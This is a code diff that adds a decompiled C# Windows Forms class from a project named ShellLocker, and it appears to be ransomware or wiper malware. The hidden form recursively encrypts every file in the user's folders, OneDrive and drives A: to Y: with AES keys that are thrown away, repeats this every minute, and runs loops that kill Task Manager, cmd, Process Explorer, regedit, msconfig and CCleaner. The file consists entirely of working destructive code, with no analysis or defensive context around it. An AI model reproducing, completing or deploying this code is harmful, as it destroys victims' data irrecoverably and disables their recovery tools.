@@ -1,0 +1,1148 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Threading;
+using System.Windows.Forms;
+using Microsoft.VisualBasic.CompilerServices;
+
+namespace ShellLocker;
+
+[DesignerGenerated]
+public class Form4 : Form
+{
+	private IContainer components;
+
+	public const int VK_LWIN = 91;
+
+	public const int KEYEVENTF_KEYUP = 2;
+
+	private int i;
+
+	private int i2;
+
+	private int i3;
+
+	private int i4;
+
+	private int i5;
+
+	private string Location;
+
+	private const int SETDESKWALLPAPER = 20;
+
+	private const int UPDATEINIFILE = 1;
+
+	private RichTextBox erhaltenerText;
+
+	private string path1;
+
+	private string path2;
+
+	private object userDir;
+
+	private static List<WeakReference> __ENCList = new List<WeakReference>();
+
+	internal virtual Timer Timer1
+	{
+		[CompilerGenerated]
+		get
+		{
+			return _Timer1;
+		}
+		[MethodImpl(MethodImplOptions.Synchronized)]
+		[CompilerGenerated]
+		set
+		{
+			EventHandler eventHandler = Timer1_Tick;
+			Timer timer = _Timer1;
+			if (timer != null)
+			{
+				timer.remove_Tick(eventHandler);
+			}
+			_Timer1 = value;
+			timer = _Timer1;
+			if (timer != null)
+			{
+				timer.add_Tick(eventHandler);
+			}
+		}
+	}
+
+	protected override CreateParams CreateParams
+	{
+		get
+		{
+			CreateParams createParams = ((Form)this).get_CreateParams();
+			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
+			return createParams;
+		}
+	}
+
+	[DebuggerNonUserCode]
+	protected override void Dispose(bool disposing)
+	{
+		try
+		{
+			if (disposing && components != null)
+			{
+				components.Dispose();
+			}
+		}
+		finally
+		{
+			((Form)this).Dispose(disposing);
+		}
+	}
+
+	[DebuggerStepThrough]
+	private void InitializeComponent()
+	{
+		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
+		//IL_001c: Expected O, but got Unknown
+		components = new Container();
+		Timer1 = new Timer(components);
+		((Control)this).SuspendLayout();
+		Timer1.set_Enabled(true);
+		Timer1.set_Interval(60000);
+		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
+		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
+		((Form)this).set_ClientSize(new Size(10, 10));
+		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
+		((Form)this).set_MaximizeBox(false);
+		((Form)this).set_MinimizeBox(false);
+		((Control)this).set_Name("Form4");
+		((Form)this).set_Opacity(0.0);
+		((Form)this).set_ShowIcon(false);
+		((Form)this).set_ShowInTaskbar(false);
+		((Form)this).set_WindowState((FormWindowState)1);
+		((Control)this).ResumeLayout(false);
+	}
+
+	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+	public static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);
+
+	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+	private static extern int SystemParametersInfoA(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);
+
+	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+	private static extern int GetAsyncKeyState(int vkey);
+
+	public Form4()
+	{
+		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0023: Expected O, but got Unknown
+		((Form)this).add_Load((EventHandler)Form4_Load);
+		erhaltenerText = new RichTextBox();
+		userDir = "C:\\\\Users\\\\";
+		InitializeComponent();
+	}
+
+	public void crypt2()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), aesKey);
+	}
+
+	public void crypt3()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), aesKey);
+	}
+
+	public void crypt4()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Personal), aesKey);
+	}
+
+	public void crypt5()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), aesKey);
+	}
+
+	public void crypt6()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("C:\\Users\\" + Environment.UserName + "\\Contacts\\", aesKey);
+	}
+
+	public void crypt7()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("C:\\Users\\" + Environment.UserName + "\\Downloads\\", aesKey);
+	}
+
+	public void crypt8()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll(Conversions.ToString(RuntimeHelpers.GetObjectValue(userDir)), aesKey);
+	}
+
+	public void crypt35()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("C:\\Users\\" + Environment.UserName + "\\OneDrive\\", aesKey);
+	}
+
+	public void crypt()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), aesKey);
+	}
+
+	public void crypt11()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("A:\\", aesKey);
+	}
+
+	public void crypt12()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("B:\\", aesKey);
+	}
+
+	public void crypt13()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("D:\\", aesKey);
+	}
+
+	public void crypt14()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("E:\\", aesKey);
+	}
+
+	public void crypt15()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("F:\\", aesKey);
+	}
+
+	public void crypt16()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("G:\\", aesKey);
+	}
+
+	public void crypt17()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("H:\\", aesKey);
+	}
+
+	public void crypt18()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("I:\\", aesKey);
+	}
+
+	public void crypt19()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("J:\\", aesKey);
+	}
+
+	public void crypt20()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("K:\\", aesKey);
+	}
+
+	public void crypt21()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("L:\\", aesKey);
+	}
+
+	public void crypt22()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("M:\\", aesKey);
+	}
+
+	public void crypt23()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("N:\\", aesKey);
+	}
+
+	public void crypt24()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("O:\\", aesKey);
+	}
+
+	public void crypt25()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("P:\\", aesKey);
+	}
+
+	public void crypt26()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("Q:\\", aesKey);
+	}
+
+	public void crypt27()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("R:\\", aesKey);
+	}
+
+	public void crypt28()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("S:\\", aesKey);
+	}
+
+	public void crypt29()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("T:\\", aesKey);
+	}
+
+	public void crypt30()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("U:\\", aesKey);
+	}
+
+	public void crypt31()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("V:\\", aesKey);
+	}
+
+	public void crypt32()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("W:\\", aesKey);
+	}
+
+	public void crypt33()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("X:\\", aesKey);
+	}
+
+	public void crypt34()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("Y:\\", aesKey);
+	}
+
+	public void crypt9()
+	{
+		byte[] aesKey = AES.AES.generateKey();
+		new RSACryptoServiceProvider();
+		encryptAll("C:\\", aesKey);
+	}
+
+	private static void encryptAll(string dir, byte[] aesKey)
+	{
+		DirectoryInfo directoryInfo = new DirectoryInfo(dir);
+		checked
+		{
+			try
+			{
+				FileInfo[] files = directoryInfo.GetFiles("*.*");
+				int num = files.Length - 1;
+				for (int i = 0; i <= num; i++)
+				{
+					FileInfo fileInfo = files[i];
+					CryptFile.encryptFile(fileInfo.FullName, aesKey);
+				}
+				DirectoryInfo[] directories = directoryInfo.GetDirectories();
+				int num2 = directories.Length - 1;
+				for (int j = 0; j <= num2; j++)
+				{
+					DirectoryInfo directoryInfo2 = directories[j];
+					encryptAll(directoryInfo2.FullName, aesKey);
+				}
+			}
+			catch (Exception ex)
+			{
+				ProjectData.SetProjectError(ex);
+				Exception projectError = ex;
+				ProjectData.SetProjectError(projectError);
+				ProjectData.ClearProjectError();
+				ProjectData.ClearProjectError();
+			}
+		}
+	}
+
+	private void Form4_Load(object sender, EventArgs e)
+	{
+		Thread thread = new Thread(crypt);
+		thread.Start();
+		Thread thread2 = new Thread(crypt2);
+		thread2.Start();
+		Thread thread3 = new Thread(crypt3);
+		thread3.Start();
+		Thread thread4 = new Thread(crypt4);
+		thread4.Start();
+		Thread thread5 = new Thread(crypt5);
+		thread5.Start();
+		Thread thread6 = new Thread(crypt6);
+		thread6.Start();
+		Thread thread7 = new Thread(crypt7);
+		thread7.Start();
+		Thread thread8 = new Thread(crypt8);
+		thread8.Start();
+		Thread thread9 = new Thread(crypt9);
+		thread9.Start();
+		Thread thread10 = new Thread(crypt35);
+		thread10.Start();
+		try
+		{
+			Thread thread11 = new Thread(crypt9);
+			thread11.Start();
+		}
+		catch (Exception projectError)
+		{
+			ProjectData.SetProjectError(projectError);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread12 = new Thread(crypt11);
+			thread12.Start();
+		}
+		catch (Exception projectError2)
+		{
+			ProjectData.SetProjectError(projectError2);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread13 = new Thread(crypt12);
+			thread13.Start();
+		}
+		catch (Exception projectError3)
+		{
+			ProjectData.SetProjectError(projectError3);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread14 = new Thread(crypt13);
+			thread14.Start();
+		}
+		catch (Exception projectError4)
+		{
+			ProjectData.SetProjectError(projectError4);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread15 = new Thread(crypt14);
+			thread15.Start();
+		}
+		catch (Exception projectError5)
+		{
+			ProjectData.SetProjectError(projectError5);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread16 = new Thread(crypt15);
+			thread16.Start();
+		}
+		catch (Exception projectError6)
+		{
+			ProjectData.SetProjectError(projectError6);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread17 = new Thread(crypt16);
+			thread17.Start();
+		}
+		catch (Exception projectError7)
+		{
+			ProjectData.SetProjectError(projectError7);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread18 = new Thread(crypt17);
+			thread18.Start();
+		}
+		catch (Exception projectError8)
+		{
+			ProjectData.SetProjectError(projectError8);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread19 = new Thread(crypt18);
+			thread19.Start();
+		}
+		catch (Exception projectError9)
+		{
+			ProjectData.SetProjectError(projectError9);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread20 = new Thread(crypt19);
+			thread20.Start();
+		}
+		catch (Exception projectError10)
+		{
+			ProjectData.SetProjectError(projectError10);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread21 = new Thread(crypt20);
+			thread21.Start();
+		}
+		catch (Exception projectError11)
+		{
+			ProjectData.SetProjectError(projectError11);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread22 = new Thread(crypt21);
+			thread22.Start();
+		}
+		catch (Exception projectError12)
+		{
+			ProjectData.SetProjectError(projectError12);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread23 = new Thread(crypt22);
+			thread23.Start();
+		}
+		catch (Exception projectError13)
+		{
+			ProjectData.SetProjectError(projectError13);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread24 = new Thread(crypt23);
+			thread24.Start();
+		}
+		catch (Exception projectError14)
+		{
+			ProjectData.SetProjectError(projectError14);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread25 = new Thread(crypt24);
+			thread25.Start();
+		}
+		catch (Exception projectError15)
+		{
+			ProjectData.SetProjectError(projectError15);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread26 = new Thread(crypt25);
+			thread26.Start();
+		}
+		catch (Exception projectError16)
+		{
+			ProjectData.SetProjectError(projectError16);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread27 = new Thread(crypt26);
+			thread27.Start();
+		}
+		catch (Exception projectError17)
+		{
+			ProjectData.SetProjectError(projectError17);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread28 = new Thread(crypt27);
+			thread28.Start();
+		}
+		catch (Exception projectError18)
+		{
+			ProjectData.SetProjectError(projectError18);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread29 = new Thread(crypt28);
+			thread29.Start();
+		}
+		catch (Exception projectError19)
+		{
+			ProjectData.SetProjectError(projectError19);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread30 = new Thread(crypt29);
+			thread30.Start();
+		}
+		catch (Exception projectError20)
+		{
+			ProjectData.SetProjectError(projectError20);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread31 = new Thread(crypt30);
+			thread31.Start();
+		}
+		catch (Exception projectError21)
+		{
+			ProjectData.SetProjectError(projectError21);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread32 = new Thread(crypt31);
+			thread32.Start();
+		}
+		catch (Exception projectError22)
+		{
+			ProjectData.SetProjectError(projectError22);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread33 = new Thread(crypt32);
+			thread33.Start();
+		}
+		catch (Exception projectError23)
+		{
+			ProjectData.SetProjectError(projectError23);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread34 = new Thread(crypt33);
+			thread34.Start();
+		}
+		catch (Exception projectError24)
+		{
+			ProjectData.SetProjectError(projectError24);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread35 = new Thread(crypt34);
+			thread35.Start();
+		}
+		catch (Exception projectError25)
+		{
+			ProjectData.SetProjectError(projectError25);
+			ProjectData.ClearProjectError();
+		}
+		try
+		{
+			Thread thread36 = new Thread(block);
+			thread36.Start();
+			Thread thread37 = new Thread(block2);
+			thread37.Start();
+			Thread thread38 = new Thread(block3);
+			thread38.Start();
+			Thread thread39 = new Thread(block4);
+			thread39.Start();
+			Thread thread40 = new Thread(block5);
+			thread40.Start();
+			Thread thread41 = new Thread(block6);
+			thread41.Start();
+			Thread thread42 = new Thread(block7);
+			thread42.Start();
+		}
+		catch (Exception projectError26)
+		{
+			ProjectData.SetProjectError(projectError26);
+			ProjectData.ClearProjectError();
+		}
+	}
+
+	public void block()
+	{
+		try
+		{
+			while (true)
+			{
+				string processName = "taskmgr";
+				Process[] processesByName = Process.GetProcessesByName(processName);
+				foreach (Process process in processesByName)
+				{
+					process.Kill();
+				}
+				Thread.Sleep(100);
+			}
+		}
+		catch (Exception projectError)
+		{
+			ProjectData.SetProjectError(projectError);
+			ProjectData.ClearProjectError();
+		}
+	}
+
+	public void block2()
+	{
+		try
+		{
+			while (true)
+			{
+				string processName = "cmd";
+				Process[] processesByName = Process.GetProcessesByName(processName);
+				foreach (Process process in processesByName)
+				{
+					process.Kill();
+				}
+				Thread.Sleep(100);
+			}
+		}
+		catch (Exception projectError)
+		{
+			ProjectData.SetProjectError(projectError);
+			ProjectData.ClearProjectError();
+		}
+	}
+
+	public void block3()
+	{
+		try
+		{
+			while (true)
+			{
+				string processName = "procexp";
+				Process[] processesByName = Process.GetProcessesByName(processName);
+				foreach (Process process in processesByName)
+				{
+					process.Kill();
+				}
+				Thread.Sleep(100);
+			}
+		}
+		catch (Exception projectError)
+		{
+			ProjectData.SetProjectError(projectError);
+			ProjectData.ClearProjectError();
+		}
+	}
+
+	public void block4()
+	{
+		try
+		{
+			while (true)
+			{
+				string processName = "procexp64";
+				Process[] processesByName = Process.GetProcessesByName(processName);
+				foreach (Process process in processesByName)
+				{
+					process.Kill();
+				}
+				Thread.Sleep(100);
+			}
+		}
+		catch (Exception projectError)
+		{
+			ProjectData.SetProjectError(projectError);
+			ProjectData.ClearProjectError();
+		}
+	}
+
+	public void block5()
+	{
+		try
+		{
+			while (true)
+			{
+				string processName = "regedit";
+				Process[] processesByName = Process.GetProcessesByName(processName);
+				foreach (Process process in processesByName)
+				{
+					process.Kill();
+				}
+				Thread.Sleep(100);
+			}
+		}
+		catch (Exception projectError)
+		{
+			ProjectData.SetProjectError(projectError);
+			ProjectData.ClearProjectError();
+		}
+	}
+
+	public void block6()
+	{
+		try
+		{
+			while (true)
+			{
+				string processName = "CCleaner64";
+				Process[] processesByName = Process.GetProcessesByName(processName);
+				foreach (Process process in processesByName)
+				{
+					process.Kill();
+				}
+				Thread.Sleep(100);
+			}
+		}
+		catch (Exception projectError)
+		{
+			ProjectData.SetProjectError(projectError);
+			ProjectData.ClearProjectError();
+		}
+	}
+
+	public void block7()
+	{
+		try
+		{
+			while (true)
+			{
+				string processName = "msconfig";
+				Process[] processesByName = Process.GetProcessesByName(processName);
+				foreach (Process process in processesByName)
+				{
+					process.Kill();
+				}
+				Thread.Sleep(100);
+			}
+		}
+		catch (Exception projectError)
+		{
+			ProjectData.SetProjectError(projectError);
+			ProjectData.ClearProjectError();
+		}
+	}
+
+	private void Timer1_Tick(object sender, EventArgs e)
+	{
+		try
+		{
+			Thread thread = new Thread(crypt);
+			thread.Start();
+			Thread thread2 = new Thread(crypt2);
+			thread2.Start();
+			Thread thread3 = new Thread(crypt3);
+			thread3.Start();
+			Thread thread4 = new Thread(crypt4);
+			thread4.Start();
+			Thread thread5 = new Thread(crypt5);
+			thread5.Start();
+			Thread thread6 = new Thread(crypt6);
+			thread6.Start();
+			Thread thread7 = new Thread(crypt7);
+			thread7.Start();
+			Thread thread8 = new Thread(crypt8);
+			thread8.Start();
+			Thread thread9 = new Thread(crypt9);
+			thread9.Start();
+			Thread thread10 = new Thread(crypt35);
+			thread10.Start();
+			try
+			{
+				Thread thread11 = new Thread(crypt9);
+				thread11.Start();
+			}
+			catch (Exception projectError)
+			{
+				ProjectData.SetProjectError(projectError);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread12 = new Thread(crypt11);
+				thread12.Start();
+			}
+			catch (Exception projectError2)
+			{
+				ProjectData.SetProjectError(projectError2);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread13 = new Thread(crypt12);
+				thread13.Start();
+			}
+			catch (Exception projectError3)
+			{
+				ProjectData.SetProjectError(projectError3);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread14 = new Thread(crypt13);
+				thread14.Start();
+			}
+			catch (Exception projectError4)
+			{
+				ProjectData.SetProjectError(projectError4);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread15 = new Thread(crypt14);
+				thread15.Start();
+			}
+			catch (Exception projectError5)
+			{
+				ProjectData.SetProjectError(projectError5);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread16 = new Thread(crypt15);
+				thread16.Start();
+			}
+			catch (Exception projectError6)
+			{
+				ProjectData.SetProjectError(projectError6);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread17 = new Thread(crypt16);
+				thread17.Start();
+			}
+			catch (Exception projectError7)
+			{
+				ProjectData.SetProjectError(projectError7);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread18 = new Thread(crypt17);
+				thread18.Start();
+			}
+			catch (Exception projectError8)
+			{
+				ProjectData.SetProjectError(projectError8);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread19 = new Thread(crypt18);
+				thread19.Start();
+			}
+			catch (Exception projectError9)
+			{
+				ProjectData.SetProjectError(projectError9);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread20 = new Thread(crypt19);
+				thread20.Start();
+			}
+			catch (Exception projectError10)
+			{
+				ProjectData.SetProjectError(projectError10);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread21 = new Thread(crypt20);
+				thread21.Start();
+			}
+			catch (Exception projectError11)
+			{
+				ProjectData.SetProjectError(projectError11);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread22 = new Thread(crypt21);
+				thread22.Start();
+			}
+			catch (Exception projectError12)
+			{
+				ProjectData.SetProjectError(projectError12);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread23 = new Thread(crypt22);
+				thread23.Start();
+			}
+			catch (Exception projectError13)
+			{
+				ProjectData.SetProjectError(projectError13);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread24 = new Thread(crypt23);
+				thread24.Start();
+			}
+			catch (Exception projectError14)
+			{
+				ProjectData.SetProjectError(projectError14);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread25 = new Thread(crypt24);
+				thread25.Start();
+			}
+			catch (Exception projectError15)
+			{
+				ProjectData.SetProjectError(projectError15);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread26 = new Thread(crypt25);
+				thread26.Start();
+			}
+			catch (Exception projectError16)
+			{
+				ProjectData.SetProjectError(projectError16);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread27 = new Thread(crypt26);
+				thread27.Start();
+			}
+			catch (Exception projectError17)
+			{
+				ProjectData.SetProjectError(projectError17);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread28 = new Thread(crypt27);
+				thread28.Start();
+			}
+			catch (Exception projectError18)
+			{
+				ProjectData.SetProjectError(projectError18);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread29 = new Thread(crypt28);
+				thread29.Start();
+			}
+			catch (Exception projectError19)
+			{
+				ProjectData.SetProjectError(projectError19);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread30 = new Thread(crypt29);
+				thread30.Start();
+			}
+			catch (Exception projectError20)
+			{
+				ProjectData.SetProjectError(projectError20);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread31 = new Thread(crypt30);
+				thread31.Start();
+			}
+			catch (Exception projectError21)
+			{
+				ProjectData.SetProjectError(projectError21);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread32 = new Thread(crypt31);
+				thread32.Start();
+			}
+			catch (Exception projectError22)
+			{
+				ProjectData.SetProjectError(projectError22);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread33 = new Thread(crypt32);
+				thread33.Start();
+			}
+			catch (Exception projectError23)
+			{
+				ProjectData.SetProjectError(projectError23);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread34 = new Thread(crypt33);
+				thread34.Start();
+			}
+			catch (Exception projectError24)
+			{
+				ProjectData.SetProjectError(projectError24);
+				ProjectData.ClearProjectError();
+			}
+			try
+			{
+				Thread thread35 = new Thread(crypt34);
+				thread35.Start();
+			}
+			catch (Exception projectError25)
+			{
+				ProjectData.SetProjectError(projectError25);
+				ProjectData.ClearProjectError();
+			}
+		}
+		catch (Exception projectError26)
+		{
+			ProjectData.SetProjectError(projectError26);
+			ProjectData.ClearProjectError();
+		}
+	}
+}
